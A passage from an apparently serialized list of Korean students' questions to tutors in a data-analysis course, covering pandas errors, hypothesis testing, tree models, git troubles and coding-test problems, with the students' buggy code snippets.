지워지지가 않음. \\n\\n어떻게 해야할까요?\",\n","       '자치구를 구코드로 바꾸면 키에러나요...!\\n\\n위에서도 자치구를 쓰고 있구요...!!',\n","       \"그 자치구에 NaN 이라고 떠있는 곳은 버스정류장ARS번호가 다 '~'인 친구들인가요???\",\n","       '튜터님! 여기서 중위값이 1.5라는 걸 어떻게 알 수 있는 건지 알 수 있을까요??\\n',\n","       \"# 이동인구(합) column의 데이터 타입을 바꿔주세요\\nseoul_moving = seoul_moving.astype({'이동인구(합)':'float'})\\n--\u0026gt;  float으로 바꿔주는 이유를 이동인구의 합이 실수형인 경우를 고려하여 float 타입으로 변환한다라고 생각하면 될까요? 3미만 사람이 *이라서 float형으로 못 쓰고 object형이였던 걸 바꿔주고 ,그것도 그렇고 정수로 안떨어져서 실수로 받는 거라고 생각하면 될까요?\",\n","       '이전에 올린 3289번 문제에 대한 질문 중  \"이때, 상을 받는 학생이 없을 수도 있습니다.\"라는 조건에 대한 질문에 대해\\n===============\\n5 3\\n10 10 10 10 10 과 같은 경우에는\\nP의 최대값 9 가 출력됩니다. (상을 받을 학생이 없음)\\n===============\\n라는 답변을 받았습니다.\\n\\n하지만 저는 커트라인(P)이 1~10점이면 5명, 11~100점이면 0명이 받는다고 생각되어 \\n9점이면 5명 학생 모두 상을 받는 경우라고 생각되어 P가 100점이지 않나 싶습니다.\\n\\n그렇다면 점수의 범위가 1~100점이기에\\n5 3\\n100 100 100 100 100 \\n인 경우에는 또 어떤지 궁금합니다... \\n\\n제대로 푼 것 같은데 계속해서 마지막 테스트케이스만 틀려서 이상한(?) 조건에 대한 질문을 드립니다.\\n\\n감사합니다\\n\\n',\n","       '이것도 가설 분석에 쓰고 싶어서 불러왔는데요,\\n열의 제목에 예를 들면 교과학원, 교과학원.1\\n이렇게 되어 있는 걸 아래의 열이랑 바로 합쳐서\\n교과학원 사업체수, 교과학원 종사자수 이렇게 보이게 하려면\\n어떻게 코드를 짜야할까요...?',\n","       \"서울버스 1.4에서 \\n문자열에서 숫자열로 변환을 시키려고, \\nseoul_business.replace('-', 0, inplace=True)   \\n로 변환했는데\\n\\nastype을 사용해서 object를 float형태로 변환 하려하는데 \\ncould not convert string to float: '5,912'  \\n이렇게 애러나서\\n\\n혹시 천의자리 숫자 때문인지 \\nseoul_business.replace(',','', inplace=True) \\n를 사용해봤는데\\n\\n천의자리 쉼표가 안 없어 지고, \\nastype도 여전히 애러가 납니다.\\n무엇이 문제일까요?\\n\",\n","       '안녕하세요.\\n혹시 점수가 표시 안되는 것은 문제가 없나요? \\n단순 표기 오류인지 궁금합니다.',\n","       '지금 보고있는 ppt를 찾기가 어렵습니다. 학습자료에서 파이을 어디서 찾을 수 있을까요?',\n","       '@튜터 18님\\n감사합니다! 그런데 왜 fail이 뜨는 걸까요...?\\n진짜 너무 답답합니다ㅠㅠ',\n","       '현재 조장님께서 edit설정에서도 바꾸고 로그아웃도 진행하고 했지만 모두가 view only 상태입니다 혹시\\n방법 공유 다시 부탁드려도 될까요 수도권 DX 13조 입니다 ',\n","       '1과 개요에서는 test와 train을 분리하고 그것으로 평가를 했는데 그외의 실습에서는 test를 나누지 않고 train과 validation만 나누고 그것으로 평가를 하는데 왜 그런 것인가요?',\n","       '가설 검정을 하는 이유가 모델링할 때 타겟과 관련 있는 피쳐들 위주로 선택해서 모델을 만들기 위함인가요? \\n이 말씀을 해주셨던 것 같기도 한데 잘 기억이 안 나네요.',\n","       '어제 강의에서 모델링을 사용하면 feature에 대한 중요도를 나중에 추가로 배울거라고 해주셨는데\\n\\n이 때 중요도가 이변량 분석에서 두 데이터 간의 관계가 큰지 작은지 판별하는 내용이랑 다른 건가요?',\n","       '분석에 필요한 외부 공공데이터를 수집해서 이용하는 게 가능한지 궁금합니다!',\n","       '안녕하세요!  오늘까지 한 주피터 파일을 기반으로 내일 피피티까지 작성하는게 맞을까요?\\n아니면 내일 새로운 데이터 셋을 가지고 팀원들과 새로운 프로젝트를 만들어 피피티를 작성하는 것일까요?',\n","       '안녕하세요, 튜터님! \\n강사님께서 공유해주신 데이터를 그대로 불러오는 과정에서 해당 오류가 발생하는데, 이유를 문의 드려도 될까요?',\n","       '안녕하세요! \\n지금 가설검증을 하고 솔루션을 도출하고 있는데 사실 가설 검증을 하는 것과 그것을 바탕으로 솔루션을 도출하는게 잘 이해가 가지 않는데 혹시 예시를 하나 들어서 설명 부탁드려도 괜찮을까요??\\n',\n","       '이진분류에서 이직이 1, 잔류가 0 이런건 알겠는데 그걸 정하는 기준이 무엇일까요?\\n만약 분석하다가 이직을 0으로 생각하고 잔류를 1로 잘못 계산하는 경우 아예 다른 결과가 나올것 같은데 이것을 방지하기 위해, 0과1이 무엇을 나타내는지 헷갈릴 경우 아는 방법이 궁금합니다',\n","       '실습 데이터중에 df_seoul_people이라는 데이터의 정보를 보면 도착시군구코드가 int로 나오는데\\n도착시군구코드는 범주아닌가요? \\n\\n데이터 정보에는 object가 아닌 int형으로 되어있어서 수치상으로 비교는 가능하지만 \\n범주인 값으로 비교한 이 차이가 맞는 비교인지 궁금해서 질문 드립니다.\\n또한 이를 수치상으로 어떻게 변경해서 비교해야하는지도 부탁드리겠습니다,\\n\\n감사합니다!\\n',\n","       '이럴때 t검정을 써야 하나요?? 분석을 했는데 nan이라고 나와서 결측치를 어떻게 처리해줘야할까요??',\n","       '조별 프로젝트 ppt에 가설 3개 써있는데,  가설 4개나 5개 발표해도되나요?',\n","       '가설 검증 과정에 어떤 내용을 써야 되나요?',\n","       'information gain에 대해서 한 번 더 설명 가능하실까요?',\n","       '방금 설명해 주신 내용에서 over_time 변수를 기준으로 true , false로 나누며 트리구조가 그려졌는데 왜 over_time 변수로 나뉘었는지, 초기 변수를 지정하는 기준이 뭔가요 ㅜㅜ 설명해주신것 같은데 제가 놓친것 같습니다\\n----------------\\n해결하였습니다!!',\n","       '과제 결과를 보니 오늘도 첨부 오류가 발생한 것 같아 혹시 몰라 문의드립니다..',\n","       '어제 처음 소개하실 때는 단변량이 분석에 없어도 괜찮다고 하셨던 걸로 기억을 합니다.\\n다른 팀원들도 그렇구요... 그래서 ipynb 파일에는 없고, PPTX에는 넣어서 제출한 상태입니다.\\n\\n근데 오늘은 단변량을 넣으라고 하셔서 추가로 넣었습니다.이런 경우에도 감점이 될까요...?\\n\\n단변량을 할 줄 모르거나 개념이 없어서 넣지 않은 것이 아닌,\\n넣지 않아도 된다고 하셔서 워낙 분석을 다양하게 하여 양이 너무 많아\\n단변량이 의미가 비교적 적다고 판단하여 넣지 않은 것이었었습니다...',\n","       '자치구에 따라 이용승객 수가 달라지는지를 보기위해 anova를 시행해보려고 하는데 코드의 가이드라인을 알려주시면 감사하겠습니다',\n","       '강사님께도 여쭤봤지만 만약 구으로 묶어서 데이터가 25개인 df안에서 노선수와 이동인구의  p-value가 0.05보다 커서 귀무가설을 기각할 수 없을 때 동으로 묶어서 데이터가 더 늘어난다면  노선수와 이동인구의  p-value가 0.05보다 작아져서 귀무가설을 기각할 수도 있나요??? ',\n","       '위에서 친 내용이 이렇게 복사가 돼서요 ,,, 오류없는 파일로 다시 안주시겠죠??',\n","       '랜덤 서치 튜닝 진행할때 cv 결과를 보면 검은색 박스에 나와있는 값과 빨간색 박스에 나와있는 값이 각각 어떤걸 의미하나요?',\n","       '활용할 데이터 불러오는게 pd.read_csv 이렇게만 하는게 맞나요?',\n","       '안녕하세요!\\nvisibility 변수의 의미를 정확하게 이해를 못해서 질문 드립니다!\\n시정거리라고 생각하고, 변수가 커질 수록 먼 거리까지 육안으로 확인 가능하다, 대기의 혼탁도가 낮다 라고 판단하면 될까요 ??\\n감사합니다.',\n","       \"안녕하세요\\npm10변수에 결측치가 생겨서 제거를 하려고 하는데\\nbike['ozone'].dropna(axis= 0, inplace=True) 이렇게\\n하고 다시 bike['ozone'].isna().sum()을 이용해서 결측치 제거확인을 했는데\\n제거가 안되더라구요 ..\\n제 코드에 문제가 있는 걸까요 ? ㅠㅠ\\n감사합니다.\",\n","       \"P_0 = dfmh.loc[dfmh['3hour'] == 0, 'count']\\nP_1 = dfmh.loc[dfmh['3hour'] == 3, 'count']\\nP_2 = dfmh.loc[dfmh['3hour'] == 6, 'count']\\nP_3 = dfmh.loc[dfmh['3hour'] == 9, 'count']\\nP_4 = dfmh.loc[dfmh['3hour'] == 12, 'count']\\nP_5 = dfmh.loc[dfmh['3hour'] == 15, 'count']\\nP_6 = dfmh.loc[dfmh['3hour'] == 18, 'count']\\nP_7 = dfmh.loc[dfmh['3hour'] == 21, 'count']\\n\\nspst.f_oneway(P_1, P_2, P_3, P_4, P_5, P_6, P_7, P_0)\\n\\n3시간씩 묶어서 만든열과 따릉이이용수를 f_onway로 검증시도를 했는데요\\n첨부파일 보듯 결과가\\nF_onewayResult(statistic=nan, pvalue=nan)\\nnan값이 나와서 왜 그런지 궁금합니다.\",\n","       '결측치 확인을 bike[var].isna().sum() 로 해서 결측치가 있다고 나왔을 때,\\n결측치 없는 값만을 뽑아오려면 bike[var] = bike[var].notnull()로 저장하는게 맞나요?',\n","       '안녕하세요! ㅠ 예전에 8/12일날 git 다루기로 문의 드린 것이 있는데\\n원격 오늘 원격 지원 요청드려도 될까요?\\n수업시간 제외하고 요청드립니다!!',\n","       \"안녕하세요!\\n\\n따릉이 데이터셋에서 'hour' 라는 변수에 대해 질문하고 싶은데요!\\n\\n여기서 값을 보면 0~24던데요. 따릉이 대여시간을 말하는 건지 아니면 0시~1시 사이와 같이 시각을 의미하는 건지 궁금합니다.\",\n","       '현재 전진선택법에 로지스틱회귀 가 예시로 있는데 저 모델을 KNN이나 SVM으로 변경하면 KNN이나 SVM에 좀더 맞는 변수가 선택되어 지는건가요? 아니면 그냥 통상적으로 로지스틱회귀로  다같이 사용하나요?',\n","       '안녕하세요\\n1. 화면처럼 int64로 나오면 자료가 범주형이라는 뜻이 맞나요?\\n2. humidity는 수치형 자료인게 맞나요?\\n3. 그러면 저 자료는 범주형으로 되어 있으니 수치형으로 바꿔주어야 하는건가요?\\n4. 범주형에서 어떻게 수치형으로 바꿀 수 있을까요?\\n\\n감사합니다.',\n","       '질문1) 처음에 pvalue가 0.0이 나와서 질문드려보니\\n\" 시간은 범주형이고 hour값에 중복이 있으니 0~23시로 groupby로 묶어서 해보라\" 라는답변을 받았습니다.\\n그래서 사진과 같이 groupby해서 풀었는데 이렇게 해결하라는 뜻이 맞으셨을까요?\\n\\n아니면, td_month = traindata.groupby(by=[\\'hour\\'], as_index=False).count() 이렇게 해야 할까요?\\n\\n\\n질문2) 이건 다른 질문인데, 사진과 같이 결측치가 안 지워지는데, 어떻게 지워야 할까요?',\n","       '안녕하세요.\\n제목 그대로 범주형 데이터와 수치형 데이터의 차이가 잘 다가오지 않습니다.\\n확실히 데이터 타입에서 오브젝트와 같이 범주형인 데이터는 문제 없지만,\\nint와 float에서 차이를 잡는 것이 너무 어렵습니다.\\n\\n타이타닉 데이터에서 P class와 같이 보면 이해가 되지만, \\n오늘과 같은 새로운 데이터를 받고 고민했을 때 범주형 데이터 같기도 수치형 데이터 같기도 합니다.\\n\\n그렇게 수치형 데이터라고 생각하여 상관관계를 분석하고 scatter를 통해 이변량 분석을 진행하면\\n해당 그래프가 옳은 것인지 모르겠습니다.\\n\\n혹시 제가 참고할 동영상이나 예시와 같이 범주형, 수치형을 비교할 수 있는 문제은행이 있을지, 아니면 비교하는 방법에 대해 조금 더 자세히 알려주실 수 있는지 궁금합니다.',\n","       \"var = 'ozone'\\nresult = spst.pearsonr(bike[var], bike[target])\\nprint(f'상관계수 : {result[0]}, p-value : {result[1]}')\\n\\n다른값에서는 오류가 안뜨는데 오존이랑 미세먼지에서만 오류가 뜹니다! ㅜ\",\n","       \"데이터 프레임 traindata로 변경하여도 같은 오류코드가 발생합니다!\\n참고로 앞쪽에는 런 돌렸을 때 발생된 오류는 없습니다\\n혹시 실수형이어서 데이터 변환이 필요한가?라는 생각에 정수형으로 변환도 진행해줬습니다!\\n\\nbins = [0,30,80, 150, 160]        \\ntraindata['PM2.5 level'] = pd.cut( traindata['PM2.5'], bins=bins, labels=list('good','normal', 'bad', 'very bad') )\\n\\n---------------------------------------------------------------------------\\nTypeError                                 Traceback (most recent call last)\\n in \\n      1 bins = [0,30,80, 150, 160]\\n----\u0026gt; 2 traindata['PM2.5 level'] = pd.cut( traindata['PM2.5'], bins=bins, labels=list('good','normal', 'bad', 'very bad') )\\n\\nTypeError: list expected at most 1 argument, got 4\",\n","       \"수치형 데이터 두 개간 상관분석을 위해\\n습도와 대여량 간의 피어슨 상관계수를 구해봤습니다.\\n\\nspst.pearsonr(dd['humidity'], dd['count'])\\n\\n데이터프레임 이름을 dd로 선언한 상태에서 이렇게 코드를 짰는데\\n\\n결과가 (-0.4789554265904137, 0.0)라고 출력됩니다.\\n\\n음의 강한 상관관계면서 임계점보다도 낮은 p-value,\\n통계적으로 상관관계가 없을 확률이 0에 가깝다라고 이해하면 되는걸까요? \",\n","       \"1.  강사님께서 변수의 분포 확인 때 사용한 countplot이 가시성에서만 그려지지 않습니다.\\n(밑에는 제가 작성한 코드입니다!)\\nvar ='visibility'\\nvis = seoul_tt[var]\\nvis.head()\\n\\nsns.countplot(vis)\\nplt.show()\\nsns.kdeplot(vis)\\nplt.show()\",\n","       'ValueError: Found input variables with inconsistent numbers of samples: [800, 1000]\\n\\nknn알고리즘을 이용한 k-fold 실행에서 이러한 오류가 있었는데 내부의 값에서 표현이 어려워 보였습니다.\\n혹시 대처할 수 있는 방법이 있을까요?',\n","       'subbplot에서 계속 출력 오류가 발생하여 문의 드립니다ㅠㅠ',\n","       '안녕하세요!\\n이변량 분석할 때 사진 오른쪽과 같이\\n weather.groupby(by=[var], as_index = False)[target].sum()\\ngroup화를 진행한 후 분석해야 하나요?\\n\\n아니면 왼쪽처럼 원본 데이터를 분석해야하나요?\\ntarget = count 입니다!\\n감사합니다',\n","       '3. 결측치 처리로 dropna를 사용했는데 이변량 분석: 시각화와 수치화에서 오류가 뜹니다.',\n","       '미세먼지 수치를 좋음, 보통, 나쁨, 매우 나쁨 순으로 나누어 분석해보려고 하는데, 이때 분석은 구간을 나누어 하나하나 pearsonr을 구하는게 맞을까요? 아니면 cut을 통해 아노바를 구하는게 맞을까요?',\n","       'from datetime import datetime\\nimport datetime\\ntd[\\'date\\'] = pd.to_datetime(td[\\'date\\'], format= \\'%Y-%m-%d\\') 이거랑\\n\\ntd[\\'year\\'] = pd.to_datetime(td[\"date\"]).dt.year\\ntd[\"month\"] = pd.to_datetime(td[\"date\"]).dt.month\\ntd[\"day\"] = pd.to_datetime(td[\"date\"]).dt.day\\n이것도 해봤는데\\n\\n에러코드가KeyError: \\'date\\' 가 나옵니다',\n","       'features 랜덤에서 스플릿이 됐을 때 x1이 선정되면 x1이 빠지는게 아니라 복원추출 하는 건가요?\\n 두 번 째 스플릿 할때는 또 원래의 features들 중에서 랜덤으로 뽑아서 불순도를 측정해서 원본 데이터에 가장 영향이 큰 x2(복원추출을 하는거고 또 그 중 x1이 영향이 크다면 x1)를 뽑는건가요?',\n","       '저희조가 4시 30분까진줄 알고 ppt제출을 못했는데  ppt 제출해야하는게 맞았나요? 지금 발표 모임 에 올려도 되는건가요...? 조원 중 한분은 제출을 안해도 되는거 아니냐고 해서 헷갈려서요 ',\n","       '코딩마스터스 문제 풀면서 열심히 파이썬을 연습하는 중입니다.\\n근데 문득 공지를 떠올려보니 코딩마스터스(1차?)가 9월 2일까지더라구요.\\n\\n혹시 9월 2일 이후엔 코딩마스터스가 닫히나요?\\n아니면 처음 제공된 100문제만 닫히고 새로운 문제가 공개되나요?\\n\\n코딩마스터스 계속 이용하고 싶습니다!',\n","       \"case 2가 실패로 뜨는데 어디가 틀린 건가요?\\n\\nx = int(input())\\nif x == 1:\\n    print('jjamppong')\\nelif x % 2 == 0:\\n    print('jjajangmyeon')\\nelse:\\n    print('bokkeumbap')\",\n","       \"안녕하세요! 지난 답변 감사드립니다!\\n\\n지난 답변에 이어서, 그렇다면 입력값이 (5, 1) 이고,\\n학생들의 점수 분포가 (1, 1, 1, 1, 1) 이라면\\n출력 값이 1이어야 하는지요?\\n\\nex) 30 50 60 70 80 이면 80이 최대 점수이니 80~100은 고려하지 않는다.\\n문제가 점수가 나오기 전 커트라인이 이미 정해진 절대평가 개념이 아니고\\n점수중에서 가능한 한 많은 학생들이 상을 받을수 있게 하는 상대평가 개념이기 때문인 것 같습니다.\\n\\n답변해주신 내용으로 생각하면, 모두가 1점이기에 '점수 중에서' 고를 수 있는 숫자는 1 뿐입니다.\\n논리적으로는 P점이 1점이면, 5명 모두가 상을 받게 되는 것이니 많이 아리송합니다.\\n\\n출제자의 의도가 아리송한데, 입력 값이 (5, 1) 이고 // 학생 점수 분포가 (1,1,1,1,1) 이라면,\\n아무도 상을 받아선 안되니, 출력 값은 2 이어야 하지 않을까요?\\n\\n궁금즘이 해소되지 않아 재질문 드립니다!!\\n\\n1차 질문에서 드렸던, 입력 값이 (학생 3, 상을 받을 수 있는 최대 인원 1) 이고 //\\n점수 분포가 입력 최대치인 1,000,000,000 / 1,000,000,000 / 1,000,000,000 // 일 때\\n출력 값이 P가 999,999,999 여야 하는 것도 아직 명확하게 이해하지 못했습니다!\\n\\nP가 999,999,999면 점수가 999,999,999 이상인 3명의 학생이 모두 상을 받게 되기 때문입니다.\\n놓친 것이 있나 계속 살펴보겠습니다!\",\n","       'case 6에서만 fail이 발생합니다.\\n오류가 있는 부분이 어디일지 몰라서 질문합니다',\n","       '네 방금도 옵션 실행하고 fit 했는데도 score는 안 뜨네요ㅠㅠ',\n","       'dicision tree 에서는 max_feature가 정보 전달량에 의해서 변수가 결정되는 건 알고 있는데 어제 random forest에서는 feature가 정보 전달량에 상관없이 무작위로 선택되는 걸로 알고 있었는데 제가 잘못 알고 있는건가요??',\n","       \"# -*- coding: utf-8 -*-\\nimport sys\\n\\na = int(sys.stdin.readline())\\nb = sys.stdin.readline()\\n\\nif b == 'MON':\\n    b = 1\\nelif b == 'TUE':\\n    b = 2\\nelif b == 'WED':\\n    b = 3\\nelif b == 'THU':\\n    b = 4\\nelif b == 'FRI':\\n    b = 5\\nelif b == 'SAT':\\n    b = 6\\nelif b == 'SUN':\\n    b = 7\\n\\nprint(a, b)\\n\\nif c % 7 == 1:\\n    c = 'MON'\\nelif c % 7 == 2:\\n    c = 'TUE'\\nelif c % 7 == 3:\\n    c = 'WED'\\nelif c % 7 == 4:\\n    c = 'THU'\\nelif c % 7 == 5:\\n    c = 'FRI'\\nelif c % 7 == 6:\\n    c = 'SAT'    \\nelse:\\n    c= 'SUN'\\n\\nprint(a + b)\\n\\n\\n중간에 시행하는 if문에서 b가 전혀 연산이 안됩니다..\\n예를들어 4, WED를 입력하고 print(a, b)를 돌려보면\\n그대로 4, WED로 출력이 나옵니다....\\n\\nif문에서  WED가 3으로 바뀌지 않는 이유가 뭘까요 ㅠㅠ\",\n","       '변수 중요도를 시각화가 아닌 각 feature에 대해서 직관적으로 점수를 확인할 수 있는 방법은 없나요?',\n","       '2. k명이하가 안되는 즉, 문제 마지막 부분에서 (이때, 상을 받는 학생이 없을 수도 있습니다.) 인 경우에 무엇을 출력하면 되는 것인가요?\\n예를 들어\\n5 2\\n100 40 50 60 90\\n위와 같은 경우일 때 2명 이하의 상을 받는 경우의 수가 존재하지 않는 경우를 이때, 상을 받는 학생이 없을 수도 있다고 받아들였는데 이때의 경우에 무엇을 출력하는 것인가요?',\n","       '안녕하세요 :) 이어서 문의 드립니다.\\n\\n미니프로젝트 2차 4일차 서울 따릉이 데이터에서 미세먼지 변수와 따릉이 대여수 변수 간의 상관 분석에 대해 질문드립니다. 미세먼지와 대여수는 생각했을 때 강한 상관관계를 가질 것 같은데, 예상 과는 다르게 아래와 같이 약한 상관 관계를 가져 문의 드립니다.\\n따로 서울시 기상 관련 이슈를 보았을 때 2021년에 대부분의 날들이 미세먼지를 가지고 있고 미세먼지의 평균 수치가 거의 매달 비슷해서 이런 수치가 나온 것이라고 생각했는데, 저의 생각 타당한지 궁금해서 문의드립니다.\\n\\n감사합니다. ',\n","       \"graph = [list(input().split()) for _ in range(5)]\\n\\ndef dfs(x,y):\\n  if x4 or y4:\\n    return False\\n\\n  if graph[x][y] =='#':\\n    graph[x][y]='.'\\n    dfs(x-1,y)\\n    dfs(x,y-1)\\n    dfs(x+1,y)\\n    dfs(x,y+1)\\n    return True\\n  return False\\n\\nresult = 0\\nfor i in range(5):\\n  for j in range(5):\\n    if dfs(i,j) == True:\\n      result +=1\\n\\nif result == 1:\\n  print('YES')\\n\\nelse:\\n  print('NO')\\n\\n왜 IndexError: list index out of range 오류가 뜨는지 모르겠습니다\",\n","       \"p, q = map(int, (input().split()))\\nn = int(input())\\nif p in range(1,11) :\\n    if p \u0026lt; q :\\n        if q in range(1,11) :\\n            print(f'''{round((p/q),(n)):,.{n}f}''')\\n\\n왜 3/5를 했을 때 0.59999999999999997779553950749686919152736663818359375 이런 게 나올까요....?\",\n","       \"출력값이 모든 조건에 맞는 것 같은데 모든 case에서 fail이 나와 문의드립니다.\\n아래는 코드입니다. 어디서 잘못된 걸까요...\\n\\n# RGB\\n\\nimport numpy as np\\nnm = input().split()\\nhi = int(nm[0])\\nwi = int(nm[1])\\n\\na = [input().split() for i in range(hi)]\\nb = [input().split() for i in range(hi)]\\n\\nq = []\\n\\nfor i in range(hi):\\n        for z in range(wi):\\n            a1 = a[i][z]\\n            b1 = b[i][z]\\n            if ((a[i][z] == 'R')\u0026(b[i][z] == 'G')) or\\\\\\n            ((a[i][z] == 'G')\u0026(b[i][z] == 'R')):\\n                q.append('Y')\\n            if ((a[i][z] == 'G')\u0026(b[i][z] == 'B')) or\\\\\\n            ((a[i][z] == 'B')\u0026(b[i][z] == 'G')):\\n                q.append('C')\\n            if ((a[i][z] == 'B')\u0026(b[i][z] == 'R')) or\\\\\\n            ((a[i][z] == 'R')\u0026(b[i][z] == 'B')):\\n                q.append('M')\\n            if (a[i][z] == 'R')\u0026(b[i][z] == 'R'):\\n                q.append('R')\\n            if (a[i][z] == 'G')\u0026(b[i][z] == 'G'):\\n                q.append('G')\\n            if (a[i][z] == 'B')\u0026(b[i][z] == 'B'):\\n                q.append('B')\\nif hi \u0026gt; 1:\\n    def list_chunk(lst, n):\\n        return [lst[i:i+n] for i in range(0, len(lst), n)]\\n    q = list_chunk(q, hi)\\n    \\nq = np.array(q)         \\nprint(q)\",\n","       '첨부한 내용은 Overtime에 원래 값이 YES, NO로 되어있었고 이를 가변수화 하여 DT를 만들은 모습입니다!\\n그림에서 Overtime_YES \u0026lt;=0.5 로 되어있고 가지의 왼쪽 방향은 항상 YES, 오른쪽 방향은 항상 NO라고 하셨는데\\n그러면 Overtime이 0일때 YES가 되는거고, 이 의미는 야근을 \"한다\" 는 의미가 맞는지요?\\n그리고 표 안에 gini의 값은 부모 노드의 지니불순도라고 배웠는데\\n제일 상단의 node에 나오는 gini불순도는 자기 자신의 지니 불순도를 뜻한다고 보면 되는건가요?',\n","       '파일\u0026gt;기본설정\u0026gt;설정 : Files: Exclude 에서 ** / .git 제거합니다\\n\\n해결하다가 계속 놓치고 있는데 원격조종으로 현재 진행 된 사항까지 적용 부탁드려도 괜찮을까요..?',\n","       '예제입력 2번을 실행해보니 예시 답과 다르게\\n0.3198484848484848264149604801787063479423522949218750000000000000000000000000000000000000000000000000\\n이런 결과가 출력됩니다. 어떤 부분에서 잘못된 걸까요? \\n아래는 제 코드입니다.\\n-----------------------------------------------------\\np, q = map(int, input().split())\\nn = int(input())\\nr = p/q\\nprint(format(r, f\".{n}f\"))',\n","       'git status 를 했는데 work1,2,3,이 아무것도 안나오고 \\n$ git status\\nOn branch master\\nnothing to commit, working tree clean\\n이렇게 나옵니다,, 혹시 원격으로 한번 봐주실 수 있나요..?',\n","       '방금 예시에서 평균 1000원으로 계속 진행이 되었는데, 계속 진행이 될수록 평균에도 변화가 생기지 않는지 궁금합니다. 아니면 일정 기간동안은 평균을 고정한채로 진행하는 건가요?ㅠㅠ',\n","       \"안녕하세요. 3389번 문제 관련하여 질문드립니다!\\n코드 작성 후 다양한 예시를 넣어 모두 알맞은 정답이 나오는 것을 확인했는데,\\n채점 결과 하나의 테스트 케이스에서만 fail이 뜹니다. \\n혹시 실패로 뜨는 테스트 케이스가 상을 받는 학생이 없는 경우일까 하는데\\n이때는 아무 것도 출력을 하지 않는 것이 맞나요?\\n아님 다른 특정한 수(0 이나 -1 등)를 출력해야 하는 건가요?\\n아님 다른 특별한 예외가 있는걸까요...?\\n답변주시면 감사하겠습니다..:)\\n\\n(혹시 답변 주실때 도움이 될까 하여 코드 첨부하겠습니다:))\\nn, k = map(int, input().split())\\nscore = list(map(int, input().split()))\\nscore2 = score.copy()\\n\\n\\nresult2 = []\\n\\nscore2.insert(0, 0)\\nscore2.insert(n + 1, 0) \\n\\n\\n\\nfor i in range(len(score)):\\n    result = []\\n    for j in range(1, len(score2)-1):\\n        if (score2[j] \u0026gt;= score[i]) or (score2[j+1] \u0026gt;= score[i]) or (score2[j-1] \u0026gt;= score[i]):\\n            result.append(1)\\n        elif (score2[j] \u0026lt; score[i]) and (score2[j+1] \u0026lt; score[i]) and (score2[j-1] \u0026lt; score[i]):\\n            result.append(0)\\n    result2.append(list(result))\\n\\n\\n\\nresult3 = []\\nfor i in range(len(result2)):\\n    result3.append(result2[i].count(1))\\n\\nresult4 = []\\nfor i in range(len(result3)):\\n    if result3[i] \u0026lt;= k:\\n        result4.append(i)\\n\\nif result4 == []:\\n    print('상x')\\nelse:\\n    result5 = []\\n    for i in range(len(result4)):\\n        result5.append(result3[result4[i]])\\n\\n\\n    result7 = max(result5)\\n\\n    result8 = []\\n    for i in range(len(result3)):\\n        if result3[i] == result7:\\n            result8.append(i)\\n        \\n\\n    result6 = []\\n    for i in range(len(result8)):\\n        result6.append(score[result8[i]])\\n\\n    b = max(result6)\\n    print(b)\",\n","       '한 케이스에서만 타임아웃이 걸리는데 이유를 모르겠습니다\\n코드 복붙하니 잘려 링크로 첨부합니다\\nhttps://colab.research.google.com/drive/1wCvt4HiyjcgJp6g6tocxlK01j98EiMcX?usp=sharing',\n","       \"a = list(input())\\nb = list(input())\\n\\n\\nif sorted(a) != sorted(b):\\n    print('NO')\\nelif len(a) == len(b):\\n    print('YES')\\nelse:\\n    print('YES')\\n\\n이렇게 짰는데 1Fail 떠용 ㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠ\\n뭐가 잘못됐나여 .. 도와주세요 ..... \\n1페일이 제일 어려워요 ㅜㅜㅜㅜㅜ\",\n","       'import sys\\nn = int(input())\\nc = 0\\nd = 0\\nfor i in range(1, n+1):\\n    a, b = map(int, input().split())\\n    if a \u0026gt; b:\\n        c=c+1\\n        d=d\\n    elif a \u0026lt; b:\\n        c=c\\n        d=d+1\\n    else:\\n        c=c\\n        d=d\\nprint(c,d)\\n\\n의 경우 오류 없이 잘 돌아가는데, 1, 3, 5 case에서 Failed가 뜨네요...\\n오류 문구조차 없어서 어디가 틀린지 모르겠습니다..ㅠㅠ 도와주세요',\n","       \"안녕하세요 튜터님 항상 감사드립니다.\\nimport sys\\n\\npeople_num = int(sys.stdin.readline())\\nquiz_num = int(sys.stdin.readline()).split(' ')  # 여기가 문제인 것 같은데 확인 한번 부탁드려요\\n \\np = quiz_num.sum()\\nif p \u0026lt;= 99 :\\n    print(100-p)\\nelse:\\n    print(0)\",\n","       '저번에 질문했던 내용입니다 나중에 질문 해 달라고 하셔서 지금 질문합니다!\\n실행속도가 실행 할때마다,  서버상황에따라 다르게 나오는것 같은데  실행속도에 따른 문제순위가 전체순위에 영향을 크게 주는 부분인지 궁금합니다.',\n","       \"안녕하세요! 제가 문제를 풀긴 했는데 실행 시간도 오래 걸리고, 그리 체계적인 방법이 아닌 것 같습니다. 이 문제 풀이의 기반이 되는 중요 개념이나, 제 코드보다 효율적인 방법이 있을까요?\\n--------------------\\nimport numpy as np\\nn = int(input())\\na=[]\\nb=[]\\nd=[]\\nr=0\\n\\nfor i in range(n):\\n    a.append(input().split())\\nfor i in range(n):\\n    if '1' in a[i]:\\n        b.append(a[i])\\nc = np.array(b).T\\n\\nfor i in c:\\n    if ('2' in i) \u0026 ('1' in i) :\\n        for j in range(len(i)):\\n            if i[j] == '2':\\n                r += 1\\nprint(r)\",\n","       \"마지막 케이스가 틀리다고하는데 왜 그런걸까요???\\n\\nday = int(input())\\n        \\nd_m = day // 60\\nd_s = day % 60\\n\\nm = 59 - d_m\\nm = format(m, '02')\\ns = 60 - d_s\\ns = format(s, '02')\\n\\nprint(f'11:{m}:{s}')\",\n","       \"안녕하세요 \\npip install BeautifulSoup \\n\\ntitle_len=[]\\nfor index,row in df,iterrows():\\n    soup=BeatifulSoup(row.html_code,'html.parser')\\n    title_len.append(title_length(soup))\\n\\n두가지 실행시에 에러가 발생하는데 어떻게 조치하면 될까요??\",\n","       '스크립트 길이 출력하면 0이 아닌데 0이 나오고 함수로 돌려보면 그냥 타이틀 len이랑 같게 나옵니다',\n","       'replace 함수로 변환해서 다시 해볼려고 했는데  none type 에러가 떠서 혹시 해결방법을 알려주실 수 있을까 해서 질문드립니다.',\n","       '죄송해요... 3359 번이었어요 ㅠㅠㅠ\\n이게 Failed 옆에 이유를 어디서 볼 수 있는지 몰라서 일단 캡쳐해서\\n올려드립니다..!\\n\\n코드첨부\\n\\n# -*- coding: utf-8 -*-\\nimport sys\\na = 0\\nwhile(True):\\n    k = int(input())   \\n    if(1 \u0026lt;= k \u0026lt;= 100000000):\\n        while(True):\\n            if (k % 2 == 1):\\n                k=k+1\\n                continue\\n            elif (k % 2 == 0):\\n                a = k // 2\\n                if 